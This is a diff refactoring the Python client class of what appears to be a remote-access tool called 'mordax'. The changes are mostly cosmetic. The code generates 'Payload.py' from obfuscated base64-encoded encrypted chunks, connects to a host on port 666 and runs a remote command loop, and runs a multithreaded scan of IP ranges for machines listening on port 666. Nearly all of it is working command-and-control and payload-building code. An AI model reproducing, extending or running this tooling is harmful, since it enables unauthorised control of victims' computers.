@@ -6,10 +6,13 @@ from tqdm import tqdm
 import Crypt
 import CheckVersion
 
-class Client(Compiler.Compile,Crypt.Crypt, CheckVersion.checkVersion):
+
+class Client(Compiler.Compile, Crypt.Crypt, CheckVersion.checkVersion):
+    def __init__(self):
+        self.ip2 = "0.0.0.0"
+        self.ip_range = "0.0.0.0"
 
     def create_payload(self):
-        iv = self.KeyAndIv("8s6Ge9dd", "OVbfVVRciZNgcObT")
         code = ['O0QP3FUgPRMu3mL2NVS+AA==', 'my3R2l1t2UyvaqpPqKkAlU5flXDVetBSIIZENGSZRsI=', 'p/p5rIEYnuq70S5VrYgjaw==',
                 'YA2X3JrBHnqd0Due4UHXRw==', 'z52LLLsoeUUmfv1DnMeLHw==', 'gNGlvvWQmrg3SBK4XNxpmw==',
                 'tN5A2V8wV911uvgs01ajLg==', 'msE3Rs/veke5q5U1CXcLsw==', 'ja3WP9wwskQbTBzXymx6RtDcaJqEr2M8alhvnmCYI3E=',
@@ -62,19 +65,18 @@ class Client(Compiler.Compile,Crypt.Crypt, CheckVersion.checkVersion):
                 'gNGlvvWQmrg3SBK4XNxpmw==', 'gNGlvvWQmrg3SBK4XNxpmw==', 'or0sxXIs13wbHWKMruLwLFWKYWAWn17KfUZbMEPnM+o=',
                 'Dfc2S1iK0ub4+UAapCrPWQ==']
 
-        with open("Payload.py", "w+") as file:
+        with open("Payload.py", "w+") as f:
             print("Decrypting File...")
             for i in tqdm(range(len(code))):
-                file.write(self.b64Dec(code[i]))
+                f.write(self.b64Dec(code[i]))
             try:
                 self.check("Payload.py")
             except Exception as E:
                 print(E)
 
-
     def connect(self, host):
 
-        State = 1
+        state = 1
         port = 666
         timeout = 0
 
@@ -86,21 +88,20 @@ class Client(Compiler.Compile,Crypt.Crypt, CheckVersion.checkVersion):
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        while State == True:
+        while state:
 
             try:
-                s.connect((host,port))
-            except Exception:
+                s.connect((host, port))
+            except socket.error:
                 print("server is offline")
                 timeout = timeout+1
                 if timeout == 5:
-                   exit()
+                    exit()
             else:
-                State = 0
+                state = 0
         iv = self.KeyAndIv("mordax", 0)
         s.send(iv)
-        text = "<command:>"
-        SIZE = 2048
+        text = "<command:>"                                                                         # BLOCK_SIZE = 2048
 
         while True:
 
@@ -122,80 +123,68 @@ class Client(Compiler.Compile,Crypt.Crypt, CheckVersion.checkVersion):
                 print (data2[0])
                 text = data2[1] + ">"
             else:
-                print data[0]
+                print (data[0])
                 text = self.depad(data[1])
                 text = text + ">"
 
-    def scan(self, args):
+    def scan(self):
 
-       start = raw_input("Start IP: ")
-       stop = raw_input("Stop IP: ")
-       self.args = args
+        start = raw_input("Start IP: ")
+        stop = raw_input("Stop IP: ")
+        ip1 = start.split(".")
+        self.ip2 = stop.split(".")
+        self.ip_range = ip1[0] + "." + ip1[1] + "." + ip1[2] + "."
 
-       ip1 = start.split(".")
-       self.ip2 = stop.split(".")
-       self.iprange = ip1[0] + "." + ip1[1] + "." + ip1[2] + "."
+        thread_0_ip = int(ip1[3])
+        thread_1_ip = int(ip1[3]) + 1
+        thread_2_ip = int(ip1[3]) + 2
+        thread_3_ip = int(ip1[3]) + 3
+        thread_4_ip = int(ip1[3]) + 4
+        thread_5_ip = int(ip1[3]) + 5
+        thread_6_ip = int(ip1[3]) + 6
+        thread_7_ip = int(ip1[3]) + 7
 
-       tip = int(ip1[3])
-       t1ip = int(ip1[3]) + 1
-       t2ip = int(ip1[3]) + 2
-       t3ip = int(ip1[3]) + 3
-       t4ip = int(ip1[3]) + 4
-       t5ip = int(ip1[3]) + 5
-       t6ip = int(ip1[3]) + 6
-       t7ip = int(ip1[3]) + 7
+        t1 = threading.Thread(target=self.s_scan, args=(thread_0_ip, "0",))
+        t2 = threading.Thread(target=self.s_scan, args=(thread_1_ip, "1",))
+        t3 = threading.Thread(target=self.s_scan, args=(thread_2_ip, "2",))
+        t4 = threading.Thread(target=self.s_scan, args=(thread_3_ip, "3",))
+        t5 = threading.Thread(target=self.s_scan, args=(thread_4_ip, "4",))
+        t6 = threading.Thread(target=self.s_scan, args=(thread_5_ip, "5",))
+        t7 = threading.Thread(target=self.s_scan, args=(thread_6_ip, "6",))
+        t8 = threading.Thread(target=self.s_scan, args=(thread_7_ip, "7",))
 
-       t1 = threading.Thread(target=self.sscan, args=(tip,"9","0",))
-       t2 = threading.Thread(target=self.sscan, args=(t1ip,"9","1",))
-       t3 = threading.Thread(target=self.sscan, args=(t2ip,"9","2",))
-       t4 = threading.Thread(target=self.sscan, args=(t3ip,"9","3",))
-       t5 = threading.Thread(target=self.sscan, args=(t4ip,"9","4",))
-       t6 = threading.Thread(target=self.sscan, args=(t5ip,"9","5",))
-       t7 = threading.Thread(target=self.sscan, args=(t6ip,"9","6",))
-       t8 = threading.Thread(target=self.sscan, args=(t7ip,"9","7",))
+        t1.start()
+        t2.start()
+        t3.start()
+        t4.start()
+        t5.start()
+        t6.start()
+        t7.start()
+        t8.start()
 
-       t1.start()
-       t2.start()
-       t3.start()
-       t4.start()
-       t5.start()
-       t6.start()
-       t7.start()
-       t8.start()
-
-
-    def sscan(self ,strange,srange,thread):
-
+    def s_scan(self, strange, thread):
         try:
-
-            srange = self.ip2[3]
+            stop_range = self.ip2[3]
             step = 9
 
-            for x in tqdm(range(strange,int(srange),int(step))):
+            for x in tqdm(range(strange, int(stop_range), int(step))):
                 if x < 10:
                     x = str(x)
                     x = "0" + x
                 elif x >= 10:
                     x = str(x)
 
-                ip = self.iprange + x
+                ip = self.ip_range + x
 
-                if self.args == "log":
-                    ip = str(ip)
-                    print("scanning with thread " + thread + " targetting IP: " + ip +"\n")
-                else:
-                    next
-                if self.args == "aa":
-                    self.get_aa()
+                ip = str(ip)
+                print("scanning with thread " + thread + " targeting IP: " + ip + "\n")
 
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                res = s.connect_ex((ip,666))
+                res = s.connect_ex((ip, 666))
 
                 for timeout in range(0, 5):
                     if res == 0:
                         print (ip + " is online")
 
-        except Exception():
-
-            print(Exception)
-
+        except socket.error as e:
+            print(e)
